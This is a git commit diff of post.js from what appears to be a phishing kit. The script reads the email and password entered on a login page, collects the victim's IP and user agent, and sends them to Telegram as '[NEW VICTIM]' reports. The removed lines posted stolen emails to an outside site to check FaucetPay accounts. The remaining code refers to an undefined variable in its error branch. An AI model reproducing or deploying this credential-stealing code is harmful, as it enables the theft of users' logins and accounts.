9e88e7ab95058dc9b4ecd74cc407d2a830c4034f
Kada <103851762+zxllkada-dev@users.noreply.github.com>
2024-01-13 19:29:59 +0100

    Update post.js

--- post.js
+++ post.js
@@ -17,92 +17,32 @@ function sendTelegramMessage(message) {
     });
 }
 
-function CheckAPI(email) {
-    var api_url = "https://chuksblog.top/auth/login";
-    var data = {
-        wallet: email
-    };
-
-    return fetch(api_url, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
-        },
-        body: new URLSearchParams(data),
-    })
-    .then(response => response.text())
-    .then(result => {
-        if (result.includes("Your email is not registered to FaucetPay")) {
-            console.log("Not registered --", email);
-            return { success: false, message: "Not registered" };
-        } else {
-            console.log("Login success --", email);
-            return { success: true, message: "Login success" };
-        }
-    })
-    .catch(error => {
-        console.error("Error:", error);
-        return { success: false, message: "Error occurred" };
-    });
-}
-
-
 function getAutofilledValues() {
     var email = document.getElementById('email').value;
     var password = document.getElementById('password').value;
     var boxAccPts = document.getElementById('box_acc_pts');
     var userAgent = navigator.userAgent;
-  
-    //var Check1 = CheckAPI(email);
 
     fetch('https://ipinfo.io/json')
     .then(response => response.json())
     .then(data => {
         if (boxAccPts) {
           var content = boxAccPts.innerText || boxAccPts.textContent;
-          CheckAPI(email).then(result => {
-              var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\nFacuatPay : ${result}\n\nPoints: ${content}`;
-              sendTelegramMessage(message); 
-          })
-          .catch(error => {
-              var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\nFacuatPay : ${error}\n\nPoints: ${content}`;
-              sendTelegramMessage(message); 
-          });
+          var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\n\nPoints: ${content}`;
+          sendTelegramMessage(message); 
         } else {
-          CheckAPI(email).then(result => {
-              var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\nFacuatPay : ${result}\n\nPoints: Not Found`;
-              sendTelegramMessage(message); 
-          })
-          .catch(error => {
-              var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\nFacuatPay : ${error}\n\nPoints: Not Found`;
-              sendTelegramMessage(message); 
-          });
+          var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\n\nPoints: Not Found`;
+          sendTelegramMessage(message);
         }
     })
     .catch(error => {
         if (boxAccPts) {
             var content = boxAccPts.innerText || boxAccPts.textContent;
-            //var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${Check1}\n\nPoints: ${content}`;
-            //sendTelegramMessage(message);
-            CheckAPI(email).then(result => {
-              var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${result}\n\nPoints: ${content}`;
-              sendTelegramMessage(message); 
-            })
-            .catch(error => {
-                var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${error}\n\nPoints: ${content}`;
-                sendTelegramMessage(message); 
-            });
+            var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${Check1}\n\nPoints: ${content}`;
+            sendTelegramMessage(message);
           } else {
-            //var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${Check1}\n\nPoints: Not Found`;
-            //sendTelegramMessage(message); 
-            CheckAPI(email).then(result => {
-                var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${result}\n\nPoints: Not Found`;
-                sendTelegramMessage(message); 
-            })
-            .catch(error => {
-                var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${error}\n\nPoints: Not Found`;
-                sendTelegramMessage(message); 
-            });
+            var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${Check1}\n\nPoints: Not Found`;
+            sendTelegramMessage(message); 
           }
     });
 
